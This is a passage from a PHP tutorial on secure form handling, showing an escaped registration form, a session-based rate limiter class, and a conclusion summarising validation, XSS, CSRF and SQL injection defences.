            <label>Email:</label>
            <input type="email" name="email" 
                   value="<?= htmlspecialchars($old['email'] ?? '') ?>"
                   class="<?= isset($errors['email']) ? 'error' : '' ?>"
                   required>
        </div>
        
        <div>
            <label>Age:</label>
            <input type="number" name="age" min="18" max="120"
                   value="<?= htmlspecialchars($old['age'] ?? '') ?>"
                   class="<?= isset($errors['age']) ? 'error' : '' ?>"
                   required>
        </div>
        
        <button type="submit">Register</button>
    </form>
</body>
</html>
```

### 13.3 Rate Limiting

```php
class RateLimiter {
    private $maxAttempts = 5;
    private $decayMinutes = 1;
    
    public function tooManyAttempts($key) {
        $attempts = $_SESSION['rate_limit'][$key]['attempts'] ?? 0;
        $timestamp = $_SESSION['rate_limit'][$key]['timestamp'] ?? 0;
        
        // Reset if time window passed
        if (time() - $timestamp > ($this->decayMinutes * 60)) {
            unset($_SESSION['rate_limit'][$key]);
            return false;
        }
        
        return $attempts >= $this->maxAttempts;
    }
    
    public function hit($key) {
        if (!isset($_SESSION['rate_limit'][$key])) {
            $_SESSION['rate_limit'][$key] = [
                'attempts' => 1,
                'timestamp' => time()
            ];
        } else {
            $_SESSION['rate_limit'][$key]['attempts']++;
        }
    }
}

// Usage
$limiter = new RateLimiter();
$ip = $_SERVER['REMOTE_ADDR'];

if ($limiter->tooManyAttempts($ip)) {
    http_response_code(429);
    die('Too many requests. Please try again later.');
}

$limiter->hit($ip);
```

## 14. Conclusion

### 14.1 Key Takeaways

1. **Superglobals provide access**: $_GET, $_POST, $_FILES, $_SERVER, $_SESSION
2. **GET for retrieval, POST for changes**: Use appropriate HTTP methods
3. **Always validate and sanitize**: Never trust user input
4. **Prevent XSS**: Use `htmlspecialchars()` on output
5. **Prevent SQL injection**: Use prepared statements
6. **Implement CSRF protection**: Generate and validate tokens
7. **Use PRG pattern**: Prevent double submissions
8. **Secure file uploads**: Validate type, size, and content
9. **Maintain state with sessions**: Essential for authentication
10. **Provide clear feedback**: Help users succeed with good UX

### 14.2 The Foundation for Advanced Development

Mastering basic form handling establishes the foundation for:

- **Authentication systems**: Login, registration, password reset
- **Content management**: Create, update, delete operations
- **E-commerce**: Shopping carts, checkout processes
- **APIs**: RESTful endpoints receiving POST/PUT data
- **MVC frameworks**: Understanding request handling in Laravel, Symfony
- **Full-stack development**: Backend processing for modern SPAs

### 14.3 Security as a Mindset

Form handling introduces fundamental security principles that apply throughout PHP development:

- Input validation and sanitization
- Output escaping
- CSRF protection
- Secure session management
- Principle of least privilege

### 14.4 Continuous Learning

In PHP 8, Superglobals still play an essential role in handling input and session data. However, they must be used carefully to avoid security risks. As PHP evolves, best practices continue to develop, but the core principles of secure form handling remain constant.

### 14.5 Final Thoughts

Form handling represents the critical intersection of user experience and security. Every successful web application depends on correctly receiving, validating, processing, and responding to user input. By understanding superglobals, implementing proper validation and sanitization, protecting against CSRF and XSS attacks, using the PRG pattern, and maintaining secure sessions, developers establish the robust foundation necessary for building production-ready PHP applications.

The patterns and practices covered in this paper—from basic $_POST handling to comprehensive CSRF protection—form the building blocks upon which authentication systems, APIs, and full MVC frameworks are constructed. Mastering these fundamentals ensures not just functional applications, but secure, maintainable, user-friendly systems that can scale from simple contact forms to enterprise-level platforms.

---
